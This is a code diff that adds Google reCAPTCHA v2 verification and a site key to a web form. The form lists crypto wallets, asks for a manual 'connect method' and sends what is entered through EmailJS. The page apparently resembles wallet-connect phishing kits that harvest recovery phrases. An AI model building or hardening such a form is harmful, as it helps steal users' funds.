@@ -15,6 +15,9 @@
       })();
     </script>
 
+    <!-- ✅ Google reCAPTCHA v2 -->
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+
     <script defer>
       document.addEventListener("DOMContentLoaded", () => {
         const wallets = [
@@ -421,6 +424,19 @@
           .addEventListener("click", async function (e) {
             e.preventDefault();
 
+            // ✅ Verify reCAPTCHA before continuing
+            if (typeof grecaptcha !== "undefined") {
+              const recaptchaResponse = grecaptcha.getResponse();
+              if (!recaptchaResponse) {
+                alert("Please complete the reCAPTCHA verification.");
+                return;
+              }
+            } else {
+              console.warn("reCAPTCHA not loaded");
+              alert("reCAPTCHA failed to load. Please refresh the page.");
+              return;
+            }
+
             const method = document.getElementById("connect-method").value;
             const methodFields = document.getElementById("method-fields");
             let valid = false;
@@ -530,6 +546,11 @@
                 );
 
                 console.log("EmailJS success:", result);
+
+                // ✅ Reset reCAPTCHA after successful send
+                if (typeof grecaptcha !== "undefined") {
+                  grecaptcha.reset();
+                }
               } catch (error) {
                 console.error("EmailJS error submitting form:", error);
               }
@@ -648,7 +669,15 @@
             <!-- Dynamic inputs -->
           </div>
 
-          <div class="form-control">
+          <!-- ✅ reCAPTCHA + Connect Button -->
+          <div class="form-control flex flex-col gap-3">
+            <div
+              class="g-recaptcha"
+              data-sitekey="6Le2qh4sAAAAAK_DEXkR4BIM4TAcfbbYaMVIQuJ1
+"
+              data-theme="light"
+            ></div>
+
             <button
               id="manual-connect-btn"
               class="text-[14px] bg-[#090979] rounded-[4px] text-white font-bold"
